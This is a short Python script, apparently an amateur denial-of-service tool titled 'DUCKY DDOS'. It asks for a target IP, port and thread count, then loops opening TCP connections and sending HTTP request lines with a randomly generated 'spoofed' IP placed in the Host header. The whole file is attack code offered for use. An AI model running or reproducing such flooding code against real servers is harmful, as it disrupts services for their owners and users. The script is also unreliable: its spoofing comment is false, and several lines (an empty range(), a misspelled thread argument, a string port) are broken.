import threading
import socket
import random
import struct
import pyfiglet

# Welcome Banner
ascii_banner = pyfiglet.figlet_format("DUCKY DDOS")
print(ascii_banner)

# Get target ip, port, and thread
target_ip = input("Enter target IP: ")
port = input("Enter target Port: ")
number_of_threads = input("How many simultaneous threads? ")

# Randomly generate fake IP for attack
spoofed_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

# Attack: generate connection, close, rinse and repeat
def attack():
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, port))
    s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
    s.sendto(("Host: " + spoofed_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
    s.close()

# Multithreading for attack
for i in range():
    thread = threading.Thread(taget=attack)
    thread.start()
